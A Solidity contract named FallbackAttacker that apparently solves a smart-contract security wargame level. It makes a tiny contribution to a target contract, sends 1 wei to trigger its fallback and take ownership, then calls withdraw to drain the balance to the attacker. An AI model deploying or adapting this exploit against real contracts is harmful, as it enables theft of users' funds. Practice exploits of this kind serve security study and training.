// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface targetInterface {
    function contribute() external payable;

    function withdraw() external;
}

contract FallbackAttacker {
    address private targetAddress;
    targetInterface private target;
    address private owner;

    constructor(address targetAddress_) {
        targetAddress = targetAddress_;
        target = targetInterface(targetAddress_);
        owner = msg.sender;
    }

    receive() external payable {}

    function attack() public {
        target.contribute{value: 0.001 ether - 1}();
        payable(targetAddress).transfer(1);
        target.withdraw();
    }

    function withdraw() public {
        require(msg.sender == owner, "You are not the owner!");
        payable(msg.sender).transfer(address(this).balance);
    }
}
